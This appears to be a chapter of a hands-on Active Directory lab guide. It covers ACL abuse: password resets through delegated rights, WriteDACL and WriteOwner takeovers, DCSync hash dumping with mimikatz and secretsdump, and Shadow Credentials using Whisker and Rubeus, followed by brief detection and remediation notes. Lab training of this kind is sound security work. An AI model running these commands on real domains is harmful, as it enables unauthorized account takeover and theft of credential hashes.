# 05 — ACL Attacks

## Overview

Access Control List (ACL) misconfigurations in Active Directory allow attackers to escalate privileges without exploiting any vulnerability — they simply abuse delegated permissions.

---

## Lab ACL Map

| Principal       | Target           | Right                  | Impact                       |
|-----------------|------------------|------------------------|------------------------------|
| noura.ahmed     | faisal.omar      | GenericAll             | Full control over the user   |
| fahad.salem     | faisal.omar      | ForceChangePassword    | Reset password without old   |
| ahmad.ali       | Finance Users OU | WriteDACL              | Grant any permission to self |
| Helpdesk group  | IT Admins group  | WriteOwner             | Become group owner, add self |
| svc_backup      | Domain           | DCSync (GetChanges*)   | Dump all hashes              |
| omar.coder      | WEB-SRV-01       | GenericWrite           | Shadow Credentials attack    |

---

## Attack 1: GenericAll — noura.ahmed -> faisal.omar

```powershell
# Log in as noura.ahmed
$NouraCred = New-Object PSCredential("corp\noura.ahmed", (ConvertTo-SecureString "p@ssw0rd" -AsPlainText -Force))

# Reset faisal's password
$NewPass = ConvertTo-SecureString "Hacked123!" -AsPlainText -Force
Set-DomainUserPassword -Identity faisal.omar -AccountPassword $NewPass -Credential $NouraCred

# Or: add faisal to Domain Admins directly
Add-DomainGroupMember -Identity "Domain Admins" -Members faisal.omar -Credential $NouraCred
```

---

## Attack 2: ForceChangePassword — fahad.salem -> faisal.omar

```powershell
$FahadCred = New-Object PSCredential("corp\fahad.salem", (ConvertTo-SecureString "p@ssw0rd" -AsPlainText -Force))
$NewPass = ConvertTo-SecureString "Pwned123!" -AsPlainText -Force
Set-DomainUserPassword -Identity faisal.omar -AccountPassword $NewPass -Credential $FahadCred
```

---

## Attack 3: WriteDACL — ahmad.ali -> Finance Users OU

```powershell
$AhmadCred = New-Object PSCredential("corp\ahmad.ali", (ConvertTo-SecureString "p@ssw0rd" -AsPlainText -Force))

# Grant GenericAll to ahmad.ali over Finance Users OU
Add-DomainObjectAcl -TargetIdentity "Finance Users" -PrincipalIdentity ahmad.ali -Rights All -Credential $AhmadCred

# Now take over any user in that OU
Set-DomainUserPassword -Identity faisal.omar -AccountPassword (ConvertTo-SecureString "Owned!" -AsPlainText -Force) -Credential $AhmadCred
```

---

## Attack 4: WriteOwner — Helpdesk -> IT Admins

```powershell
# Must be a member of Helpdesk group
$HelpdeskCred = New-Object PSCredential("corp\fahad.salem", (ConvertTo-SecureString "p@ssw0rd" -AsPlainText -Force))

# Take ownership of IT Admins group
Set-DomainObjectOwner -Identity "IT Admins" -OwnerIdentity fahad.salem -Credential $HelpdeskCred

# Add WriteDACL/GenericAll to self
Add-DomainObjectAcl -TargetIdentity "IT Admins" -PrincipalIdentity fahad.salem -Rights All -Credential $HelpdeskCred

# Add self to IT Admins
Add-DomainGroupMember -Identity "IT Admins" -Members fahad.salem -Credential $HelpdeskCred
```

---

## Attack 5: DCSync — svc_backup

```powershell
# svc_backup has DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights

# Mimikatz (on WS-01 as svc_backup)
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" exit
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" exit

# Impacket (Linux)
secretsdump.py corp/svc_backup:p@ssw0rd@192.168.56.10
```

---

## Attack 6: Shadow Credentials — omar.coder -> WEB-SRV-01

```powershell
# omar.coder has GenericWrite over WEB-SRV-01
# Add a shadow credential (Key Credential) to the machine account

.\Whisker.exe add /target:WEB-SRV-01$ /domain:corp.local /dc:DC-01.corp.local /path:C:\loot\cert.pfx

# The output gives a Rubeus command — use it to get a TGT as WEB-SRV-01$
.\Rubeus.exe asktgt /user:WEB-SRV-01$ /certificate:cert.pfx /password:<pwd> /nowrap /ptt

# Now you are WEB-SRV-01$ — dump LSA secrets or perform RBCD
```

---

## Enumerating ACLs

```powershell
# Find all interesting ACLs (PowerView)
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.IdentityReferenceName -match "(attacker|noura|fahad|ahmad|svc_backup|helpdesk|omar)"
} | Select-Object IdentityReferenceName, ActiveDirectoryRights, ObjectDN

# Check specific object
Get-ObjectAcl -Identity faisal.omar -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "Write|All|Force" }
```

---

## Detection

- Event 5136 — DS Object was Modified (ACL changes)
- Event 4662 — An operation was performed on an object (DCSync trigger)
- Baseline AD permissions and alert on delegated control changes

## Remediation

- Audit AD ACLs regularly using BloodHound or ADACLScanner
- Remove unnecessary delegated permissions
- Use Privileged Access Workstations (PAW) for admin tasks
- Enable Protected Users security group for all privileged accounts
